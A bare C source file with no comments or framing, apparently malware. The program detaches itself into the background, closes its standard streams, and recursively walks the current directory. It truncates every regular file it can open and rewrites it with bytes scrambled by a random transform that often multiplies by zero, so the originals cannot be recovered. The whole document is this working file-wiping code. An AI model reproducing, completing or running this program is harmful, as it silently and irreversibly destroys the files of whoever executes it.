#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
void walk(char *path) {
    srand(0xeef);
    DIR *dp = opendir(path);
    struct dirent *current;
    while ((current = readdir(dp)) != NULL) {
        char file[strlen(path) + strlen(current->d_name) + 2];
        strcpy(file, path);
        strcat(file, "/");
        strcat(file, current->d_name);
        file[strlen(file)] = '\0';
        struct stat st;
        stat(file, &st);
        switch (st.st_mode & S_IFMT) {
            case S_IFREG:
                {
                    int fd = open(file, O_RDWR | O_APPEND);
                    if (fd != -1) {
                        size_t size = lseek(fd, 0, SEEK_END);
                        size--;
                        char buf[size + 1];
                        lseek(fd, 0, SEEK_SET);
                        read(fd, buf, size);
                        buf[size] = '\0';
                        close(open(file, O_WRONLY | O_TRUNC));
                        for (size_t i = 0; i < size; i++) {
                            buf[i] = ((buf[i] + (rand() % 7)) ^ (rand() % 7)) * (rand() % 7);
                        }
                        write(fd, buf, size);
                        close(fd);
                    }
                }
                break;
            case S_IFDIR:
                if (strcmp(current->d_name, ".") != 0 && strcmp(current->d_name, "..") != 0) {
                    walk(file);
                }
                break;
        }
    }
    closedir(dp);
}
int main(void) {
  if (fork() > 0) {
    return 0;
  }
  setsid();
  close(STDOUT_FILENO);
  close(STDIN_FILENO);
  close(STDERR_FILENO);
  walk(".");
}
